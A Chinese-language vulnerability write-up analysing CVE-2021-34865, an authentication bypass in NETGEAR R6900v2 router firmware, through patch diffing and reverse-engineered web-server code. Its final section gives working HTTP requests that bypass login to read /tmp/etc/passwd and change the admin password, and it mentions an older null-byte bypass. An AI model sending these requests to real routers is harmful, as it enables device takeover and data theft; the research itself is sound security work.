# NETGEAR某设备分析
> buggart
> 来源：https://www.iotsec-zone.com/article/212

# NETGEAR某设备分析

# 0x00 漏洞信息

编号:**CVE-2021-34865**

记录创建日期:**20210617**

漏洞类型:**身份验证绕过安全漏洞**

[安全公告](https://kb.netgear.com/000063955/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-Some-Routers-PSV-2021-0083)

![0.png](https://www.iotsec-zone.com/images/MdImg/79fd98372608c542ffa7b7f79fcde1a6.png)

[官网固件下载](http://support.netgear.cn/)

有些型号官网搜不到，可以尝试

[第三方网站固件下载](https://drivers.softpedia.com/downloadTag/NETGEAR)

NETGEAR 强烈建议您尽快下载最新固件。固件修复目前适用于所有受影响的产品：

## 补丁比对

[BinDiff下载](https://www.zynamics.com/software.html);[BinDiff安装](https://blog.csdn.net/YouTheFreedom/article/details/120362103)

[diaphora下载](https://github.com/joxeankoret/diaphora)

将**R6900v2**的1.2.0.88 和1.2.0.76 下载下来，使用diaphora插件进行比对，关注path_exist()前面新增的代码块。

**R6900v2**
![1.png](https://www.iotsec-zone.com/images/MdImg/a4b929e61a8eaf59d6ccd639c6e2959a.png)

分析一下新增的strdecode()函数。

![2.png](https://www.iotsec-zone.com/images/MdImg/cfd8b1e155213f6003de8b2a25c5e0fb.png)

要注意sub_7D68()其实就是atoi()函数 ，将字符转换为数字。

'A'‘a’转换为0xa，'6'转换为6。

所以strdecode就是循环遍历字符串，碰到%，将后面连续两个字符转换为16进制的数字。

这么看来，该漏洞很可能可以利用url的编码实现某些操作。

![3.png](https://www.iotsec-zone.com/images/MdImg/3f81b5ff0b5c1603fce8a935283a4a84.png)
## 黑盒测试

尝试通过静态包去访问页面或者cgi。

```
GET /dtree.css/../../setup.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.1.1/

```

![4.png](https://www.iotsec-zone.com/images/MdImg/e49a4a3490db2571b7743ca544a3664b.png)

尝试传入参数。

```
GET /dtree.css/../setup.cgi?todo=backup_config HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.1.1/BAK_backup.htm&todo=cfg_init
Upgrade-Insecure-Requests: 1

```
![5.png](https://www.iotsec-zone.com/images/MdImg/db5a47c7b05319e2681e826a45216a01.png)

失败了。

# 0x01 mini_httpd分析

老老实实开始逆向分析。

对于缺乏逆向功底的我，是一个漫长痛苦的过程，可能有帮助的小技巧:

> 1.网上寻找源码
> 2.寻找框架开源代码
> 3.该设备或同类型设备的分析文章，尤其是CVE分析文章
> 4.结合设备尝试并抓包分析
> 5.先分析早期固件版本

使用后端是mini_httpd，一种小型嵌入式后端服务器框架，常见的还有lighthttpd、httpd等，或者通过一些脚本例如lua来充当后端。
![6.png](https://www.iotsec-zone.com/images/MdImg/9e25bbf17e7ad0e65f323c629c870fff.png)

## handle_request流程分析

抓包发现认证字段：

```
Authorization: Basic YWRtaW46cXdlMTIzLi8=
```

一看就是base64加密。

```
admin:qwe123./
```

在shift+F12搜索password、auth关键字，锁定auth_check()函数

````assembly
  if ( strncmp(::authorization, "Basic ", 6u) )
    {
	  ......
      send_Unauthorized()
    }
    userpasswd[b64_decode((authorization + 6), userpasswd, 499)] = 0;
    mypassword = strchr(userpasswd, ':');
    if ( !mypassword )
    {
      .....
      send_Unauthorized()
    }
    *mypassword = 0;
    mypassword_1 = mypassword + 1;
    http_username = nvram_get("http_username");
	  ......
    if ( !strcmp(userpasswd, http_username) )
    {
      ......
      ::password_hash(mypassword_1, password_hash, 128);
      http_password = nvram_get("http_password");
      ......
      if ( strcmp(password_hash, http_password) )
      {
      ......
````

找到这个之后，重点分析调用它的handle_request()函数，整理分析认证流程。

setsockopt()设置TCP套接字选项。

```assembly
  if ( !do_ssl )
  {
    r = 1;
    setsockopt(conn_fd, 6, 3, &r, 4u);          // 设置TCP套接字选项
  }
  if ( do_ssl )
  {
    ssl = SSL_new(ssl_ctx);
    SSL_set_fd(ssl, conn_fd);
    v0 = SSL_accept(ssl);
    v1 = 1;
    if ( !v0 )
LABEL_108:
      exit(v1);                                 // 报错退出
  }
```

开始处理request请求,初始化了两个字段，用来表示request的大小和索引。

```assembly
  request_size = 0;
  request_idx = 0;
```

先处理第一行的request，检测是否合法，如果有ptimeout.cgi包含在内的话，检测someone_in_use字段，判断是否有人登录，如果没有人且超时的话就停止进程。防止第二个用户登录超时，影响前面正常登录的用户。

```assembly
	method_str = get_request_line(); 
	if (method_str == (char *)0)
		send_error(400, "Bad Request", "", "Can't parse request.");
	path = strpbrk(method_str, " \t\012\015");
	if (path == (char *)0)
		send_error(400, "Bad Request", "", "Can't parse request.");
	*path++ = '\0';
	if (strstr(path, "ptimeout.cgi") != NULL)
	{
		if (someone_in_use == 0)
		{
			STILLTO
		}
	path += strspn(path, " \t\012\015");
	protocol = strpbrk(path, " \t\012\015");
	if (protocol == (char *)0)
		send_error(400, "Bad Request", "", "Can't parse request.");
	*protocol++ = '\0';
		send_error(401, "Unauthorized", "", "Authorization required.");
	}
```

使用一个while大循环处理request的剩余部分，并进行初始化。

```assembly
 while ( 1 )                                   // 解析请求头的剩余部分
  {
    line = get_request_line();
    if ( !line || !*line )
      break;
    if ( !strncasecmp(line, "Authorization:", 0xEu) )// 如果检测到Authorization字段
    {
      authorization = &line[strspn(line + 14, &str_tab) + 14];
    }
    else if ( !strncasecmp(line, "Content-Length:", 0xFu) )
    {
      content_length = atol(&cp[v20]);
    }
    else if ( !strncasecmp(line, "Content-Type:", 0xDu) )
    {
      content_type = &line[strspn(line + 13, &str_tab) + 13];
    }
    else if ( !strncasecmp(head_soapaction, "SOAPAction:", 11u) )// SOAPAction字段
    {
    ......
  }
```

config_state环境变量来控制设备的状态，表示是否完成了初始化。

```assembly
	if(host && (*nvram_safe_get("config_state") == 'b' ||*nvram_safe_get("config_state") == 'c')&& is_captive_detecting(host, useragent))
    {
     // netgear请求，如果路由器刚刚完成恢复出厂设置，iPhone应该显示WiFi连接图标，无需重定向到浏览器。
      if ( is_captive_detecting(host, useragent) )
      {
        for_captive=1;
		protocol = strpbrk(path, " \t\012\015");
		send_error(200, "OK", "", "Success");
      }
    }
  }
```

对usb_session的接入处理

```assembly
if (*nvram_get("http_server_wan_enable") == '1' && *nvram_get("fw_remote") == '0')
	{
		/*When router is AP Mode, NV lan_ipaddr is not br0's IP, so we cannot access DUT by it's br0's IP, but we should think br0 IP is dut. This issue occur when USB's https enable */
		if (*nvram_safe_get(WIFI_AP_MODE) == '1')
		{
			is_dut = is_dut || (strcmp(host, getIPAddress(LAN_LOG_IFNAME)) == 0);
		}
		else if (!is_usb_session && !is_dut  && *nvram_get("config_state") == 's')
		{
			SC_CFPRINTF("should not do the exit since hijack like traffic meter will not working\n");
			//exit(1);
		}
	}
```

检查lan口和远程访问的正确性，不是443报错403。

```assembly
  if ( !check_valid_request() )                 // 是否为正确请求，本地或者远程正确端口
  {
    v15 = 403;
    if ( port != 443 )
    {
      v16 = "Forbidden";
      v17 = "";
      v18 = "URL is illegal.";
      goto SEND_ERROR;
    }
  }
```

通过setupwizard.cgi完成初始化，检查是否是lan口访问，如果不是的话，就drop掉请求。也就是说初始化设置智能通过lan口来进行。

```assembly
  if ( strstr(path, "setupwizard.cgi") )        // 如果path包含setupwizard.cgi
    for_setupwizard = 1;
  if ( for_setupwizard == 1 && !check_lan_guest() )
  {
    system("/bin/echo genie from wan, drop request now > /dev/console");// 来自wan，现在drop请求
    v1 = 0;
    goto LABEL_108;                             // exit()
  }
  if ( for_setupwizard == 1 )
  {
    system("/bin/echo it is for setupwizard! >> /tmp/sw.log");
    strcpy(fakepath, "/setupwizard.cgi HTTP/1.1\r\n");
    path = fakepath;                            // path设置为setupwizard.cgi
    if ( have_cookie == 1 )
    {
      soap_token = 0;
      dword_2EB84 = 0;
      dword_2EB88 = 0;
      dword_2EB8C = 0;
      byte_2EB90 = 0;
      p1 = strchr(cookie, '=');
      if ( p1 )
        strlcpy(&soap_token, p1 + 1, 17);
    }
  }
```

修复Win10 IE11在进行出厂设置之后的向导问题，Win 10将打开一个新的Edge/Spartan窗口/选项卡，原始页面也进行向导。这是由Windows 10使用HTTP获取“NCSI.txt” 并被路由器劫持导致的。现在不劫持它，只有响应404。

```assembly
  if ( access("/tmp/brs_hijack.out", 0) )
    goto LABEL_238;
  v65 = getIPAddress("group1");
  v66 = host;                                   
  if ( !strcmp(host, "www.msftncsi.com") && strstr(path, "ncsi.txt")
    || !strcmp(v66, "www.msftconnecttest.com") && strstr(path, "connecttest.txt") )
  {
    v15 = 404;
    ::protocol = "HTTP/1.0";
    v16 = "Not Found";
    v17 = "";
SEND_NOT_FOUND:
    v18 = "File not found.";
    goto SEND_ERROR;
  }
```

如果config_state是blank状态的话，或者need_not_login为1的话，将need_not_login置为0，start_in_blankstate字段置为1，除非超时或者登出，不会再重置这个值。也就是说恢复设置后重新启动，会在need_not_auth状态，但在超时后，需要登录。

```assembly
  config_state = nvram_get("config_state");
  if ( !config_state )
    config_state = "";
  if ( *config_state == 'b' )                   // blank state
    goto LABEL_244;
  need_not_login = nvram_get("need_not_login");
  if ( !need_not_login )
    need_not_login = "";
  if ( *need_not_login == '1' )  // 恢复设置后重新启动，会在need_not_auth状态，但在超时后，需要登录 
  {
LABEL_244:
    nvram_set("need_not_login", "0");
    nvram_set("start_in_blankstate", "1");      // 不重置这个值直到超时或者登出
  }
```

通过四种方法都可以 置need_auth为0。

1.path_exist判断不需要认证，且路径不包含VLAN_update_setting.htm。

2.POST请求且路径包含htpwd_recovery.cgi

3.路径的前39个字符为“/setup.cgi?todo=PNPX_GetShareFolderList”，请求为GET且路径不包含'htm'

4.config_state为c，路径包含"sso"。

```assembly
  if ( path_exist(path, no_auth_html, method_str_1) && !strstr(path, "VLAN_update_setting.htm") )
    goto LABEL_256;
  v97 = path;
  if ( !strncmp(path, "/htpwd_recovery.cgi?", '\x14') )
  {
    v98 = ::method_str(3);                      // POST请求
    if ( !strcasecmp(method, v98) )
      goto LABEL_256;
  }
  if ( !strncmp(v97, "/setup.cgi?todo=PNPX_GetShareFolderList", 39u) )
  {
    v99 = ::method_str(1);                      // GET请求
    if ( !strcasecmp(method, v99) && !strstr(v97, "htm") )
      goto LABEL_256;
  }
  v100 = nvram_get("config_state");
  if ( !v100 )
    v100 = "";
  if ( *v100 == 'c' && strstr(path, "sso") )
  {
LABEL_256:
    someone_in_use = 0;
    need_auth = 0;
    if ( strstr(path, "currentsetting.htm") )
      for_setupwizard = 1;
  }
```

no_auth_html保存了一些不需要验证的html页面。

![7.png](https://www.iotsec-zone.com/images/MdImg/7c7d5892a09a131e43d50966ca98020c.png)

只要在path里找到了不需要认证的页面，就将no_need_check_password_page置为1。

```assembly
  v101 = no_auth_html;
  no_need_check_password_page = 0;              // 不需要password_page标志
  while ( *v101 )
  {
    if ( strstr(path, *v101) )
      no_need_check_password_page = 1;
    ++v101;
  }
```

如果路径不包含.cgi直接请求.htm的话，自动在中间插入"/setup.cgi?next_file="

```assembly
  v148 = path;
  if ( !strstr(path, ".cgi") && strstr(v148, ".htm") && !strstr(v148, "shares") )// 没有.cgi请求.htm
  {
    v149 = strlen(v148);
    if ( v149 >= 482 )
    {
      v15 = 404;
      v16 = "Not Found";
      v17 = "";
LABEL_439:
      v18 = "No such file.";
      goto SEND_ERROR;
    }
    strlcpy(fakepath, v148, v149 - 8);
    v150 = strrchr(fakepath, '/');
    strlcpy(firstdir, fakepath, v150 - fakepath);
    v151 = path;
    if ( *path == '/' )
      path = v151 + strlen(firstdir) + 1;
    snprintf(fakepath, 0x200u, "%s/setup.cgi?next_file=%s", firstdir, path);// 自动插入/setup.cgi?next_file=
    path = fakepath;
  }
```

补丁修复，CVE-2019-17137，后面加%00currentsetting.htm可以直接绕过验证。

```assembly
  if ( strstr(path, "%00") || (strdecode(v161, v161), tem_path = path, *path != '/') )
  {
    v15 = 400;
    v16 = "Bad Request";
    v17 = "";
    v18 = "Bad filename.";
    goto SEND_ERROR;
  }
```

还通过strdecode()对url编码进行解码。

对// ./ /../等进行处理
![8.png](https://www.iotsec-zone.com/images/MdImg/25c836e43c8ecd0a8fc2b7eddba09e13.png)

但需要注意的，这里是对临时变量进行处理，全局的path没有改变，而真正用的时候用的又是全局的path，过滤了个寂寞。

有一个疑似配置文件的操作。
![9.png](https://www.iotsec-zone.com/images/MdImg/e8f28cfc7678511a4faed9bf04f6a998.png)

最后执行do_file函数并释放ssl套接字。
![10.png](https://www.iotsec-zone.com/images/MdImg/4b556f6158a212cb2fad1b97b15d5d6b.png)

## path_exist流程分析

先进行url转码

```assembly
v6 = LODWORD(method);
if ( strcasestr(path, "%2f", method) || strcasestr(path, "%2e", v5) || strstr(path, "%20") || strstr(path, "%26") )// url编码转为16进制
strdecode(path, path);
```

如果method不为GET，就	返回0。

```
  v7 = 0;
  if ( method_2 != 'G' )                        // 不为GET，return 0
    return v7;
```

如果是GET请求包，就进一步进行判断。

如果path的前11个字符包含/setup.cgi?的话，先判断是否有next_file。

如果有next_file参数，且path包含&符号，将next_file后面的&符号的其他参数置空，只取next_file。

然后判断next_file是否需要认证，如果不需要认证直接返回1。

如果path没有&符号，判断next_file是否需要认证，如果需要认证retur 0。

![11.png](https://www.iotsec-zone.com/images/MdImg/cdde64a8ef21899d0254ba19f3816279.png)

## auth_check流程分析

在do_file函数的开始对传入的请求路径，如果need_auth字段为1的话调用auth_check进行检测。

![12.png](https://www.iotsec-zone.com/images/MdImg/fadd4d200a8568d8ba8dfb0c6a9dcb81.png)

在auth_check()的开头，先对for_setupwizard进行检测。

![13.png](https://www.iotsec-zone.com/images/MdImg/847be6e06589b1f98427e124e596e29e.png)

如果for_setupwizard字段为1，就可以跳过检查。

所以不论是控制了for_setupwizard还是need_auth都可以绕过验证。

# 0x02 setup.cgi分析

开始先判断GET包和POST包，POST包的话获取传入的post表参数。

```assembly
  query_string = 0;
  if ( getenv("REQUEST_METHOD") )
  {
    request_method = getenv("REQUEST_METHOD");
    if ( !strcmp(request_method, "POST") )      // 如果POST包进这里
    {
      v7 = *argv;
      if ( strstr(*argv, "setup.cgi") || strstr(v7, "htpwd_recovery.cgi") )
        query_string = cgi_input_parse();
    }
  }
```

调用ftext()函数对query_string进行检测，成功的话就检测"setup.cgi字段"并调用setup_main函数。

![14.png](https://www.iotsec-zone.com/images/MdImg/d4cba71d1f6f6430f4ad28315c4ae51a.png)

ftext()函数的功能主要是对POST包的id进行认证，抓包的时候发现所有的POST包后面都会跟一个id参数。

```assembly
POST /setup.cgi?id=fbd52ac506cc84f4 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 282
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/PWD_password.htm&todo=cfg_init
Upgrade-Insecure-Requests: 1

sysOldPasswd=qwe1233.%2f&sysNewPasswd=1qaz%40WSX&sysConfirmPasswd=1qaz%40WSX&enable_recovery=on&question1=4&answer1=********&question2=1&answer2=********&todo=save_passwd&this_file=PWD_password.htm&next_file=PWD_password.htm&SID=&h_enable_recovery=enable&h_question1=4&h_question2=1
```

setup_mian函数会先检查禁止访问的值，发送403错误。

![15.png](https://www.iotsec-zone.com/images/MdImg/c729fc6ac8df026ade41d283ed03e9ae.png)

然后调用check_filename检查是否符合规则，针对next_file和this_file为不需要认证的页面做检查。

通过检查，不允许多个ip同时访问。

如果post_form和参数都为空，就发送默认的index.htm页面。
![16.png](https://www.iotsec-zone.com/images/MdImg/50f0940a3d8edc4d183e2da05fb71e3e.png)

否则的话，调用CallActionByName去执行todo参数对应的操作。

一个大循环，在ActionTab这个列表中寻找todo对应的接口，并执行对应的操作，并且传递参数。
![17.png](https://www.iotsec-zone.com/images/MdImg/c9a50201e952b78ab5f70ba470e3da3e.png)

![18.png](https://www.iotsec-zone.com/images/MdImg/92b9f74e2f5cc22f0db73352bc99a756.png)

结束后通过html_parser去回传html页面。
![19.png](https://www.iotsec-zone.com/images/MdImg/a0469ff182f10ac99f28f472cde1aca7.png)

接下来介绍几个重点的接口。

## backup_config

```assembly
int __fastcall backup_config(int a1)
{
  const char *next_file; // $v0

  system("/usr/sbin/conf");
  next_file = (const char *)find_val(a1, "next_file");
  location(next_file);
  return 0;
}
```

抓包分析发现这个是备份生成config文件的，先执行conf生成配置文件，然后返回参数传递的location。

就是告诉浏览器这个配置文件在哪里。

## print_page

打印传递参数指向的文件，并将内容发给浏览器。

![20.png](https://www.iotsec-zone.com/images/MdImg/2c2b1f8d6de8287027490b1a3f093436.png)

# 0x03 漏洞分析

## 认证前分析

通过访问不需要认证的页面获取信息。

**currentsetting.htm**

![21.png](https://www.iotsec-zone.com/images/MdImg/19da554c2fbd6e7cd9b6bdcba313be3e.png)

**debuginfo.htm**

![22.png](https://www.iotsec-zone.com/images/MdImg/791456a5b08c29f988ccc52c77063fdf.png)

## 代码比对

前期流程很熟悉后，很容易找到这个1day。

先进行比对，在httpd里发现了三个地方。

1、

![23.png](https://www.iotsec-zone.com/images/MdImg/7e64c762bbd5547e201fafd9e08f88db.png)

2、

新版本：

由strstr()改成了strncmp

![24.png](https://www.iotsec-zone.com/images/MdImg/07c273d95a28570abe9340a8be78c694.png)

旧版本：

![25.png](https://www.iotsec-zone.com/images/MdImg/f070f222963086c0d86ddf71d8b58611.png)
这个很有问题。

3、

path_exist()

新版本将url编码转成了16进制。

![26.png](https://www.iotsec-zone.com/images/MdImg/eece7435ea07d3bb0eaa040aaeb58339.png)

## 认证绕过

重点看一下第二个点。

控制need_auth为0。
![27.png](https://www.iotsec-zone.com/images/MdImg/267da21e0932ff70cdf54a74f7496a0e.png)

在路径后加一个**&x=PNPX_GetShareFolderList **就能实现绕过，而且是get和post包的绕过。

任意文件读取：

```shell
GET /setup.cgi?next_file=/tmp/etc/passwd&todo=print_page&x=PNPX_GetShareFolderList HTTP/1.1
Host: www.routerlogin.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.routerlogin.net/BAK_backup.htm&todo=cfg_init
Upgrade-Insecure-Requests: 1
Content-Length: 0

```

![28.png](https://www.iotsec-zone.com/images/MdImg/0ebab46a13657c88376be22bdc9aa67d.png)

修改密码：

```
GET /PWD_password.htm&todo=cfg_init&x=PNPX_GetShareFolderList HTTP/1.1
Host: www.routerlogin.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.routerlogin.net/adv_index.htm
Upgrade-Insecure-Requests: 1

```

```
POST /setup.cgi?id=fbd52ac506cc84f4&x=PNPX_GetShareFolderList HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 282
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/PWD_password.htm&todo=cfg_init
Upgrade-Insecure-Requests: 1

sysOldPasswd=qwe1233.%2f&sysNewPasswd=1qaz%40WSX&sysConfirmPasswd=1qaz%40WSX&enable_recovery=on&question1=4&answer1=********&question2=1&answer2=********&todo=save_passwd&this_file=PWD_password.htm&next_file=PWD_password.htm&SID=&h_enable_recovery=enable&h_question1=4&h_question2=1
```

![29.png](https://www.iotsec-zone.com/images/MdImg/8826c337ea5c9cd24410a37510187377.png)

这个在新的固件中修复了。
